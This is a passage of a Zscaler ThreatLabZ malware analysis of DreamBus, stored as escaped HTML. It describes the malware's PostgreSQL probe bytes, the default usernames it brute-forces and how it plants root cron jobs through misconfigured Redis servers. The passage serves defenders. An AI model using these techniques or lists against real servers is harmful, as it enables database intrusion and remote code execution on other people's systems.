SSH bruteforce attack. Zscaler ThreatLabZ has observed numerous versions of the \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003eDreamBus \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003ePostgreSQL\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e module with several differences between them, such as code that sets the calling thread name, and the internet ranges and port numbers that are scanned.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/p\u003e\r\n\r\n\u003cp\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003eMost PostgreSQL modules use the standard \u003cspan\u003etracepath\u003c/span\u003e naming convention mentioned earlier. However, some PostgreSQL modules set the calling thread name to \u003cspan\u003epostgres: logical replication launcher\u003c/span\u003e or \u003cspan\u003epostgres: autovacum\u003c/span\u003e.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/p\u003e\r\n\r\n\u003cp\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003eAll versions of the DreamBus PostgreSQL modules spread by scanning the RFC 1918 private networks for \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003ePostgreSQL\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e servers running on port 5432. However, the internet ranges that are scanned vary depending on the module version. Most of the modules scan the ranges listed in the DreamBus Scanning Behavior section of this report. However, at least one variant of the DreamBus \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003ePostgreSQL\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e module scans all internet ranges between 1.0.0.0/8 – 222.0.0.0/8 on ports 5432 and 5433.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/p\u003e\r\n\r\n\u003cp\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003eIn order to identify a PostgreSQL server, the DreamBus module sends the bytes \u003cspan\u003e00 00 00 08 04 D2 16 00\u003c/span\u003e. These bytes start the SSL handshake to the PostgreSQL server. The last byte of the packet, however, has been set to NULL so that it will trigger an error message from a PostgreSQL server. More specifically, the DreamBus \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003ePostgreSQL\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e module will check for the response \u003cspan\u003eunsupported frontend protocol\u003c/span\u003e. If this message is returned by the server, the module will attempt to exploit the system through a bruteforce password attack. The DreamBus PostgreSQL modules vary in the username and password lists that they use. To date, Zscaler ThreatLabZ has observed the following usernames (in aggregate) across these modules:\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/p\u003e\r\n\r\n\u003cul\u003e\r\n\t\u003cli\u003e\u003cspan\u003epostgres\u003c/span\u003e\u003c/li\u003e\r\n\t\u003cli\u003e\u003cspan\u003eredmine\u003c/span\u003e\u003c/li\u003e\r\n\t\u003cli\u003e\u003cspan\u003eroot\u003c/span\u003e\u003c/li\u003e\r\n\t\u003cli\u003e\u003cspan\u003eadmin\u003c/span\u003e\u003c/li\u003e\r\n\t\u003cli\u003e\u003cspan\u003erdsdb\u003c/span\u003e\u003c/li\u003e\r\n\t\u003cli\u003e\u003cspan\u003eclouder-scm\u003c/span\u003e\u003c/li\u003e\r\n\t\u003cli\u003e\u003cspan\u003edbadmin\u003c/span\u003e\u003c/li\u003e\r\n\t\u003cli\u003e\u003cspan\u003estolon\u003c/span\u003e\u003c/li\u003e\r\n\t\u003cli\u003e\u003cspan\u003eodoo\u003c/span\u003e\u003c/li\u003e\r\n\u003c/ul\u003e\r\n\r\n\u003cp\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003eThe PostgreSQL modules include a hardcoded dictionary of passwords, with samples containing approximately 2,627 entries. DreamBus regularly deploys second-stage modules that are designed to target Redis. The modules are very similar, all with the goal of achieving remote code execution via a misconfigured Redis installation that either does not require a password or has a weak password. These misconfigurations are well known to be exploited. \u003ca href=\"https://twitter.com/shodanhq/status/568085078447943680\"\u003eShodan\u003c/a\u003e estimated that approximately 56,000 Redis servers\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e were misconfigured with no authentication required, and \u003ca href=\"https://www.imperva.com/blog/new-research-shows-75-of-open-redis-servers-infected/\"\u003eImperva\u003c/a\u003e estimated that nearly 75 percent of open Redis instances had been compromised\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/p\u003e\r\n\r\n\u003cp\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003eDepending on the DreamBus Redis module version, the malware scans RFC 1918 private subnets on ports 6379, 7000, and 7001 and the internet ranges mentioned before. There are two primary versions of the DreamBus Redis module that either attempt to bruteforce weak passwords or exploit an instance with no password authentication.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/p\u003e\r\n\r\n\u003cp\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003eThe Redis module that is designed to bruteforce passwords first checks if the Redis server requires authentication by sending the command \u003cspan\u003einfo\u003c/span\u003e and searching for the string \u003cspan\u003eNOAUTH Authentication required\u003c/span\u003e. If this string is returned by the server, the Redis module will then send an \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003eAUTH\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e command with a password chosen from a hardcoded dictionary, which has approximately 28,930 entries. It will then check for the response \u003cspan\u003eOK\u003c/span\u003e. from the Redis server to determine whether authentication was successful. The subsequent two lines will create cron jobs that will be executed every minute to download and execute a shell command specified by the server and run as the root user. The save command will write the content to disk as a Redis database (RDB) file and, therefore, contain an RDB header. In order for this exploit to work properly, the compromised system requires a cron implementation that will continue to parse the \u003cspan\u003esystemdd\u003c/span\u003e file after encountering the RDB header (which is not a valid cron format). Additionally, in modern versions of Redis, the RDB files are compressed with LZF by default, so the implanted cron jobs may further be neutralized. The threat actor behind DreamBus is likely to continue activity for the foreseeable future hidden behind TOR and anonymous file-sharing websites. Therefore, organizations must be vigilant and take the necessary precautions to prevent infections.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/p\u003e\r\n\r\n\u003cp\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003eThere are a number of best practices that organizations can take to prevent attacks.
